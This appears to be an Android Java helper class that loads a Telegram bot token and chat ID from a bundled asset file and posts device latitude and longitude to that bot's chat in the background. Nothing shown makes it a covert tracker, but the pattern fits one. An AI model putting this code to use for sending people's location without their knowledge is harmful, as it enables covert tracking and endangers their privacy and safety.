package com.dasqin.mirtdasiram;

import android.content.Context;
import android.content.res.AssetManager;
import android.util.Log;

import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramSend {
    
    
    
    
    private static String BOT_TOKEN;
    private static String CHAT_ID;
    
    
    

    public static void initialize(Context context) {
        try {
            
            
 
    AssetManager assetManager = context.getAssets();
    InputStream inputStream = assetManager.open("bekaram.json");
    byte[] buffer = new byte[inputStream.available()];
    inputStream.read(buffer);
    String jsonString = new String(buffer, StandardCharsets.UTF_8);
    JSONObject jsonObject = new JSONObject(jsonString);
    
    
    
    
    
    
    BOT_TOKEN = jsonObject.getString("bot_token");
    CHAT_ID = jsonObject.getString("chat_id");
    } catch (Exception e) {
        
        
        
    e.printStackTrace();
    
 
    }
    }
    
    public static void sendLocationToTelegram(final double latitude, final double longitude) {
        new Thread(new Runnable() {
            
            
            
            
            
            
            
            @Override
            public void run() {
                
                
                
                
                try {
                    
                    
                    
 
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendLocation";
                    URL url = new URL(urlString);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setDoOutput(true);
                    connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    String postData = "chat_id=" + CHAT_ID + "&latitude=" + latitude + "&longitude=" + longitude;
                    OutputStream os = connection.getOutputStream();
                    os.write(postData.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    os.close();
                    int responseCode = connection.getResponseCode();
                    Log.d("TelegramSend", "Response Code: " + responseCode);
                    } catch (Exception e) {
                    e.printStackTrace();
                    
                    
                    
                    
                    }
                    
                    
                    
                    
                    
                    }
                    

                   }).start();
                   
                   
                   
                   }
                   
                   
                   
                   
                   
                  }
